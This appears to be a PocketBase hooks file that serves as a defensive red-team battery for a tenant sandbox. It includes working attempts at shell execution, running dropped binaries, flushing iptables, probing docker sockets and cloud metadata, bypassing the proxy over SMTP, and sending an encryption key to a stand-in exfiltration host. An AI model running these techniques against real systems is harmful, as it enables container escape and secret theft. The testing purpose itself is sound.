// Red-team battery (design §13.3). HOSTILE BY DESIGN — the platform assumes
// every tenant's pb_hooks already is exactly this.
//
// Two routes, because the attempts split by how they can fail:
//
//   /redteam/report  everything that answers at once: exec, filesystem, mounts,
//                    sockets, and HTTP through the proxy. One JSON report with a
//                    verdict per attempt and a POSITIVE CONTROL per technique,
//                    so a probe that could not have seen an escape says so
//                    instead of reading as contained.
//
//   /redteam/raw     one TCP dial that ignores HTTP_PROXY, per call. A dial into
//                    a netfilter DROP never returns, so the driver calls this
//                    once per target with its own deadline and reads "no answer
//                    in time" as dropped.
//
// Why /redteam/raw exists. Every tenant container carries HTTP_PROXY, set
// whether or not it holds a grant (internal/egressctl ProxyEnv), and $http.send
// honours it. So an $http.send to the metadata endpoint never addresses the
// metadata endpoint: it addresses the proxy, and on a tenant with no grant that
// is "no route" before anything else is tested. The SMTP mailer is the hook's
// raw socket — it dials the configured host itself and has no idea a proxy
// exists. Implicit TLS makes the answer fast: a live listener of any kind
// fails the TLS handshake at once instead of waiting for an SMTP greeting.
//
// EVERYTHING LIVES INSIDE THE HANDLER. PocketBase serialises a handler and runs
// it in a pooled goja runtime with no access to the enclosing module scope, so
// a top-level helper is a `ReferenceError` at request time and nowhere else
// (design.md §9.4).

routerAdd("GET", "/redteam/report", (e) => {
    const results = [];
    const controls = [];

    // attempt runs fn and records whether it ESCAPED. A throw is contained; a
    // truthy return has got somewhere it should not be.
    const attempt = (name, boundary, fn) => {
        try {
            const got = fn();
            results.push({ name: name, boundary: boundary, escaped: !!got, detail: String(got) });
        } catch (err) {
            results.push({ name: name, boundary: boundary, escaped: false, detail: String(err) });
        }
    };
    // control records a precondition the attempts above depend on. A failed
    // control means the matching attempts proved nothing.
    const control = (name, fn) => {
        try {
            const r = fn();
            controls.push({ name: name, ok: r === true, detail: r === true ? "" : String(r) });
        } catch (err) {
            controls.push({ name: name, ok: false, detail: String(err) });
        }
    };
    const errOf = (fn) => {
        try { fn(); return ""; } catch (err) { return String(err); }
    };

    // ── exec ───────────────────────────────────────────────────────────────
    // exec-shell: the image is FROM scratch, so there is no shell to run (§5).
    attempt("exec-shell", "image", () =>
        toString($os.cmd("/bin/sh", "-c", "id").combinedOutput()));

    // The image is not empty, though: /pb/pocketbase and /pb/pbsnap are real
    // executables. That is what makes the next two meaningful — exec itself
    // works, so "permission denied" below is the mount saying no, not a
    // sandbox that cannot exec anything at all.
    control("exec of a shipped binary works (pbsnap exits 2 on no args)", () => {
        const msg = errOf(() => $os.cmd("/pb/pbsnap").combinedOutput());
        return /exit status 2/.test(msg) ? true : "pbsnap: " + (msg || "no error");
    });

    // exec-dropped-binary: a copy of a shipped binary, written where the
    // tenant CAN write. Both writable paths must be noexec, or any binary a
    // hook downloads or embeds runs natively inside the sandbox.
    const dropped = (dir) => () => {
        const path = dir + "/rt-dropped";
        try { $os.remove(path); } catch (_) {}
        $os.writeFile(path, $os.readFile("/pb/pbsnap"), 0o755);
        const msg = errOf(() => $os.cmd(path).combinedOutput());
        try { $os.remove(path); } catch (_) {}
        // "permission denied" is noexec holding. Anything else — an exit
        // status, an exec format error — means the kernel was willing to run it.
        return /permission denied/.test(msg) ? false : "exec of " + path + " was attempted: " + (msg || "ran");
    };
    attempt("exec-dropped-pb_data", "mount", dropped("/pb/pb_data"));
    attempt("exec-dropped-tmp", "mount", dropped("/tmp"));

    // rule-tamper: no NET_ADMIN and no binary. Kept for continuity; it fails
    // for the same reason exec-shell does, and the capability set itself is
    // asserted host-side (posture section of run-all.sh).
    attempt("rule-tamper", "runtime", () =>
        toString($os.cmd("iptables", "-F", "DOCKER-USER").combinedOutput()));

    // ── filesystem ─────────────────────────────────────────────────────────
    attempt("escape-app-dir", "release", () => {
        $os.writeFile("/pb/app/pb_hooks/ESCAPE_MARKER", "must never exist", 0o644);
        return "wrote /pb/app/pb_hooks/ESCAPE_MARKER";
    });
    attempt("rootfs-write", "image", () => {
        const wrote = [];
        for (const p of ["/pb/ESCAPE_MARKER", "/ESCAPE_MARKER", "/pb/pocketbase"]) {
            if (!errOf(() => $os.writeFile(p, "x", 0o644))) wrote.push(p);
        }
        return wrote.length ? "wrote " + wrote.join(", ") : false;
    });

    // docker-sock: stat, not read. open(2) on a unix socket is ENXIO even when
    // the socket IS mounted, so a read could never have reported an escape.
    attempt("docker-sock", "runtime", () => {
        const found = [];
        for (const p of ["/var/run/docker.sock", "/run/docker.sock",
                         "/run/containerd/containerd.sock", "/run/citadel/control.sock",
                         "/run/caddy-admin/admin.sock"]) {
            if (!errOf(() => $os.stat(p))) found.push(p);
        }
        return found.length ? "present: " + found.join(", ") : false;
    });

    // mounts: whatever is mounted is what a hook can reach. Anything beyond the
    // two platform binds and the runtime's own plumbing is a path out.
    let mounts = [];
    control("mountinfo is readable", () => {
        mounts = toString($os.readFile("/proc/self/mountinfo")).split("\n")
            .filter((l) => l.trim() !== "")
            .map((l) => {
                const f = l.split(" ");
                return { point: f[4], opts: f[5] };
            });
        return mounts.length > 0 ? true : "empty mountinfo";
    });
    attempt("unexpected-mount", "runtime", () => {
        const allowed = (p) =>
            p === "/" || p === "/pb/pb_data" || p === "/pb/app" || p === "/tmp" ||
            p === "/etc/resolv.conf" || p === "/etc/hosts" || p === "/etc/hostname" ||
            p === "/dev" || p.indexOf("/dev/") === 0 ||
            p === "/proc" || p.indexOf("/proc/") === 0 ||
            p === "/sys" || p.indexOf("/sys/") === 0;
        const extra = mounts.filter((m) => !allowed(m.point)).map((m) => m.point);
        return extra.length ? "unexpected mounts: " + extra.join(", ") : false;
    });
    attempt("mount-flags", "mount", () => {
        const opts = (p) => {
            const m = mounts.find((x) => x.point === p);
            return m ? m.opts.split(",") : null;
        };
        const bad = [];
        const want = { "/": ["ro"], "/pb/app": ["ro"], "/pb/pb_data": ["noexec", "nosuid"], "/tmp": ["noexec", "nosuid"] };
        for (const p in want) {
            const o = opts(p);
            if (!o) { bad.push(p + " not mounted"); continue; }
            for (const flag of want[p]) {
                if (o.indexOf(flag) < 0) bad.push(p + " lacks " + flag);
            }
        }
        return bad.length ? bad.join("; ") : false;
    });

    // ── through the proxy ──────────────────────────────────────────────────
    // These go where HTTP_PROXY sends them. On a tenant with no grant that is
    // nowhere (no route); on a granted tenant it is Squid, and then the
    // allowlist and the denied-destination ACL are what is under test. A 403
    // or a reset is the proxy refusing; any other status means it forwarded.
    const viaProxy = (url) => {
        const res = $http.send({ url: url, method: "GET", timeout: 5 });
        if (res.statusCode === 403 || res.statusCode === 407) {
            return false;
        }
        return "status " + res.statusCode;
    };
    attempt("metadata-via-proxy", "egress", () => viaProxy("http://169.254.169.254/latest/meta-data/"));
    attempt("internet-via-proxy", "egress", () => viaProxy("https://www.google.com/"));
    attempt("host-via-proxy", "egress", () => viaProxy("http://127.0.0.1.nip.io:8080/"));

    // steal-enc-key: the key IS readable (§5, --encryptionEnv). What must fail
    // is getting it OUT, and every route out is attempted above and in
    // /redteam/raw. Only a digest is reported: the driver checks that two
    // tenants' keys differ and that the raw key appears nowhere on the host it
    // should not.
    const key = $os.getenv("PB_ENCRYPTION_KEY");
    // The error echoes the URL, so the key is redacted before it reaches the
    // report: the red-team log must not become the exfiltration channel.
    attempt("steal-enc-key-via-proxy", "egress", () => {
        if (!key) return false;
        try {
            return viaProxy("https://exfil.example.com/?k=" + key);
        } catch (err) {
            throw new Error(String(err).split(key).join("<key>"));
        }
    });

    const escaped = results.filter((r) => r.escaped);
    const failedControls = controls.filter((c) => !c.ok);
    return e.json(200, {
        fixture: "escape-battery",
        attempts: results,
        controls: controls,
        escaped: escaped.length,
        escaped_names: escaped.map((r) => r.name),
        controls_failed: failedControls.map((c) => c.name),
        key_sha256: key ? $security.sha256(key) : "",
    });
});

// /redteam/raw?host=&port= — one dial that ignores HTTP_PROXY.
//
// reached:  the packet got to something that answered — a reset ("connection
//           refused"), a TLS failure, an EOF, or a completed send.
// !reached: no route, or a name that did not resolve.
// A DROP never answers at all; the driver's deadline is what reports it.
routerAdd("GET", "/redteam/raw", (e) => {
    const q = e.request.url.query();
    const host = q.get("host");
    const port = parseInt(q.get("port") || "25", 10);
    const t0 = Date.now();
    let error = "";
    try {
        // enabled=true only so newMailClient returns an SMTP client rather than
        // sendmail; the address is set on the CLIENT, not the shared settings,
        // so concurrent calls cannot steal each other's target.
        $app.settings().smtp.enabled = true;
        const client = $app.newMailClient();
        client.host = host;
        client.port = port;
        client.tls = true;
        client.send(new MailerMessage({
            from: { address: "redteam@example.invalid" },
            to: [{ address: "redteam@example.invalid" }],
            subject: "redteam",
            html: "redteam",
        }));
        error = "";
    } catch (err) {
        error = String(err);
    }
    const unresolved = /lookup /.test(error);
    const unreachable = /network is unreachable|no route to host|i\/o timeout|deadline exceeded/i.test(error);
    return e.json(200, {
        fixture: "escape-battery",
        host: host,
        port: port,
        ms: Date.now() - t0,
        error: error || "sent",
        resolved: !unresolved,
        reached: !unresolved && !unreachable,
    });
});

// A working route as well, so "the instance is healthy" and "the escapes
// failed" are two separate observations rather than one.
routerAdd("GET", "/redteam/ping", (e) => e.json(200, { ok: true }));
